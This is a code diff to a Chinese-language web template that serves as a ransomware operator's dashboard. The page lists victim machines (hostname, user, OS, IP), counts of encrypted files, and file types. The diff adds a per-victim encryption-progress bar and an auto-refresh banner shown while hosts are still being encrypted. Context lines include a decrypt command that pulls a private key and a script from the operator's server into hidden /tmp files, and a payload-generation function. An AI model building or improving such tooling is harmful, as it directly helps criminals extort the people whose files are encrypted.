@@ -70,10 +70,10 @@
   <button type="submit"><i class="fas fa-search"></i></button>
 </form>
 <div class="table-wrap"><table>
-<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>文件类型</th><th>操作</th></tr></thead>
+<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>加密进度</th><th>文件类型</th><th>操作</th></tr></thead>
 <tbody>
 {% if not victims %}
-<tr><td colspan="10" class="empty">暂无受害主机数据</td></tr>
+<tr><td colspan="11" class="empty">暂无受害主机数据</td></tr>
 {% endif %}
 {% for v in victims %}
 {% set es = v.encrypted_size|default(0)|int %}
@@ -82,6 +82,15 @@
 {% elif es >= 1024 %}{% set sz = '%.2f KB'|format(es/1024) %}
 {% else %}{% set sz = es ~ ' B' %}{% endif %}
 {% set is_linux = 'linux' in (v.os|default('')|lower) or 'darwin' in (v.os|default('')|lower) %}
+{% set ec = v.encrypted_count|default(0)|int %}
+{% set tc = v.total_count|default(0)|int %}
+{% set ts = v.total_size|default(0)|int %}
+{% set ic = v.is_complete|default(1)|int %}
+{% if ts > 0 %}{% set pct = (es*100/ts)|round(0,'floor')|int %}
+{% elif tc > 0 %}{% set pct = (ec*100/tc)|round(0,'floor')|int %}
+{% else %}{% set pct = 100 if ic else 0 %}{% endif %}
+{% set pct = [[pct,0]|max,100]|min %}
+{% set ts_str = ('%.2f GB'|format(ts/1073741824)) if ts >= 1073741824 else (('%.2f MB'|format(ts/1048576)) if ts >= 1048576 else (('%.2f KB'|format(ts/1024)) if ts >= 1024 else (ts ~ ' B'))) %}
 <tr>
   <td>{{ loop.index + (page-1)*10 }}</td>
   <td>{{ v.machine_name }}</td><td>{{ v.computer_user }}</td>
@@ -89,6 +98,18 @@
   <td>{{ v.ip }}</td><td>{{ v.date }}</td>
   <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" onclick="event.preventDefault();showFileDetail('{{ v.id }}','{{ v.encrypted_detail|default("{}")|e }}')">{{ v.encrypted_count|default(0) }} 个</a></td>
   <td style="color:#4dc3fa">{{ sz }}</td>
+  <td style="min-width:150px">
+    <div style="display:flex;align-items:center;gap:8px">
+      <div style="flex:1;background:#1e293b;border-radius:6px;height:10px;overflow:hidden;min-width:78px">
+        <div style="height:10px;width:{{ pct }}%;border-radius:6px;transition:width .6s;background:{{ 'linear-gradient(90deg,#10b981,#34d399)' if ic else 'linear-gradient(90deg,#f59e0b,#ef4444)' }}"></div>
+      </div>
+      <span style="font-size:.74rem;font-weight:600;color:{{ '#10b981' if ic else '#f59e0b' }};white-space:nowrap;min-width:34px;text-align:right">{{ pct }}%</span>
+    </div>
+    <div style="font-size:.68rem;color:#64748b;margin-top:3px;white-space:nowrap">
+      {{ ec }}/{{ tc if tc > 0 else '?' }} 个 · {{ sz }}{% if ts > 0 %} / {{ ts_str }}{% endif %}
+      {% if ic %}<span style="color:#10b981">✓ 完成</span>{% else %}<span style="color:#f59e0b">● 加密中</span>{% endif %}
+    </div>
+  </td>
   <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all">{{ v.encrypted_types|default('') }}</span></td>
   <td style="white-space:nowrap">
     <button class="btn-sm" style="background:#10b981" onclick="showDecrypt('{{ v.id }}','{{ v.ip }}',{{ 'true' if is_linux else 'false' }})" title="一键解密"><i class="fas fa-unlock"></i></button>
@@ -212,7 +233,7 @@ function showFileDetail(vid,jsonStr){
   var tr=null;for(var b of btns){if(b.onclick.toString().indexOf("'"+vid+"'")>-1){tr=b.closest('tr');break;}}
   if(!tr)return;
   var nr=document.createElement('tr');nr.dataset.vid=vid;
-  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';td.innerHTML=h;
+  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';td.innerHTML=h;
   nr.appendChild(td);tr.after(nr);_detOpen=nr;
 }
 var _decOpen=null;
@@ -224,7 +245,7 @@ function showDecrypt(vid,ip,isLinux){
   var tr=null;for(var b of btns){if(b.onclick.toString().indexOf("'"+vid+"'")>-1){tr=b.closest('tr');break;}}
   if(!tr)return;
   var nr=document.createElement('tr');nr.dataset.vid=vid;
-  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';
+  var td=document.createElement('td');td.colSpan=11;td.className='dec-expand';
   if(isLinux){
     td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 (AES加密传输)\nK="'+k+'"\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem.enc -o /tmp/.jke\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 -c "\nimport base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes\nfrom cryptography.hazmat.backends import default_backend\nraw=base64.b64decode(open(\'/tmp/.jke\').read())\niv,ct=raw[:16],raw[16:]\nc=Cipher(algorithms.AES(bytes.fromhex(\'$K\')),modes.CBC(iv),default_backend()).decryptor()\npt=c.update(ct)+c.finalize()\nopen(\'/tmp/.jk\',\'wb\').write(pt[:-pt[-1]])\n"\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>';
   }else{
@@ -271,5 +292,16 @@ function genPayload(){
     res.innerHTML=h;
   }).catch(e=>{res.innerHTML='<div class="gen-err">'+e+'</div>';});
 }
+
+// ── 加密进度自动刷新 ──
+(function(){
+  var active = {{ 'true' if has_active else 'false' }};
+  if (!active) return;
+  var bar=document.createElement('div');
+  bar.style.cssText='position:fixed;top:0;left:0;right:0;z-index:9999;background:linear-gradient(90deg,#f59e0b,#ef4444);color:#fff;font-size:.8rem;font-weight:600;text-align:center;padding:6px 12px;box-shadow:0 2px 8px rgba(0,0,0,.4)';
+  bar.innerHTML='<i class="fas fa-spinner fa-spin"></i> 有主机正在加密，进度条每 10 秒自动刷新…';
+  document.body.appendChild(bar);
+  setTimeout(function(){ location.reload(); }, 10000);
+})();
 </script>
 </body></html>
